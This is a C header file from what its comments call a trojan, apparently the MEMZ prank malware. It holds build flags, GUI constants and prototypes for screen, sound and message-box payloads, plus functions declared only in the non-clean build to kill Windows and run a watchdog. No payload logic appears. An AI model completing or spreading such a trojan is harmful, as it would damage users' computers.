// If this is defined, the trojan will disable all destructive payloads
// and does display a GUI to manually control all of the non-destructive ones.
#define CLEAN

#ifdef CLEAN
// Enable XP styles
#pragma comment(linker,"\"/manifestdependency:type='win32' \
name='Microsoft.Windows.Common-Controls' version='6.0.0.0' \
processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")

// Window attributes
#define BTNWIDTH 200
#define BTNHEIGHT 30
#define COLUMNS 2
#define ROWS nPayloads/COLUMNS
#define SPACE 10
#define WINDOWWIDTH COLUMNS * BTNWIDTH + (COLUMNS + 1)*SPACE
#define WINDOWHEIGHT ROWS * BTNHEIGHT + (ROWS + 1)*SPACE + 16
#endif

#pragma once

#include <Windows.h>
#include <TlHelp32.h>
#include <Shlwapi.h>
#include <Psapi.h>
#include <CommCtrl.h>

#include "data.h"
#include "payloads.h"

int random();
void strReverseW(LPWSTR str);

DWORD WINAPI payloadThread(LPVOID);

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

#ifndef CLEAN
void killWindows();
void killWindowsInstant();

DWORD WINAPI ripMessageThread(LPVOID);
DWORD WINAPI watchdogThread(LPVOID);
#else
DWORD WINAPI keyboardThread(LPVOID lParam);
#endif

int payloadExecute(int, int);
int payloadCursor(int, int);
int payloadBlink(int, int);
int payloadMessageBox(int, int);
DWORD WINAPI messageBoxThread(LPVOID);
LRESULT CALLBACK msgBoxHook(int, WPARAM, LPARAM);
int payloadChangeText(int, int);
BOOL CALLBACK EnumWindowProc(HWND, LPARAM);
void enumerateChildren(HWND);
int payloadSound(int, int);
int payloadPuzzle(int, int);
int payloadKeyboard(int, int);
int payloadPIP(int, int);
int payloadDrawErrors(int, int);

extern int scrw, scrh;